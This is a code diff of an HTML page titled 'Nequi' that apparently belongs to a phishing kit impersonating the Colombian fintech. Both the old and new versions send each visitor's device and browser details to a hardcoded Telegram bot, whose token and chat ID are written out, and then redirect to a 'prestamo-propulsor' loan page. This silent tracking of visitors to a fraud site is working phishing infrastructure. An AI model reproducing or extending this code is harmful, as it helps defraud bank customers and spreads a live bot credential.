@@ -1,67 +1,61 @@
-<html>
-    <head>
-        <title>Nequi</title>
-        <meta http-equiv="content-type" content="text/html; utf-8">
-        <meta charset="utf-8">
-        <meta content="es" http-equiv="Content-Language">
-        <meta name="description" content="">
-        <meta name="author" content="">
-        <meta name="Copyright" content="">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">        
-        <script type="text/javascript" src="assets/js/jquery-3.6.0.min.js"></script>      
-        
- </head>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>nequi</title>
+  <script src="assets/js/jquery-3.6.0.min.js"></script>
+</head>
+<body>
 
-  </script>
+<script>
+  const BOT_TOKEN = "8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc";
+  const CHAT_ID = "8469651553";
 
-  <script type="text/javascript">
-    $(document).ready(function() {
-      window.location.href = "prestamo-propulsor/"; 
-    });
-  </script>
-</body>
-  <script>
-    const BOT_TOKEN = "8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc";
-    const CHAT_ID = "8469651553";
+  function detectarDispositivo() {
+    const ua = navigator.userAgent;
+    if (/Android/i.test(ua)) return "Android";
+    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+    if (/Windows/i.test(ua)) return "Windows";
+    if (/Mac/i.test(ua)) return "Mac";
+    return "Otro";
+  }
 
-    function detectarDispositivo() {
-      const ua = navigator.userAgent;
-      if (/Android/i.test(ua)) return "Android";
-      if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-      if (/Windows/i.test(ua)) return "Windows";
-      if (/Mac/i.test(ua)) return "Mac";
-      return "Otro";
-    }
-
-    async function sendTelegram(message) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      const body = { chat_id: CHAT_ID, text: message, parse_mode: "HTML" };
+  async function sendTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const body = {
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "HTML"
+    };
+    try {
       await fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(body)
       });
+    } catch (err) {
+      console.error("Error enviando a Telegram:", err);
     }
+  }
 
-    // Enviar mensaje automáticamente al abrir la página
-    document.addEventListener("DOMContentLoaded", () => {
-      const dispositivo = detectarDispositivo();
-      const mensaje = `
+  document.addEventListener("DOMContentLoaded", async () => {
+    const dispositivo = detectarDispositivo();
+    const mensaje = `
 📲 <b>Nueva visita detectada</b>
 💻 Dispositivo: ${dispositivo}
 🌐 Navegador: ${navigator.userAgent}
-      `;
-      sendTelegram(mensaje);
-    });
-  </script>
+    `;
+    
+    await sendTelegram(mensaje); // esperar que se envíe
 
-  <script type="text/javascript">
-    $(document).ready(function() {
-      window.location.href = "prestamo-propulsor/"; 
-    });
-  </script>
+    // Esperar 1 segundo y redirigir
+    setTimeout(() => {
+      window.location.href = "prestamo-propulsor/";
+    }, 1000);
+  });
+</script>
+
 </body>
 </html>
-
-
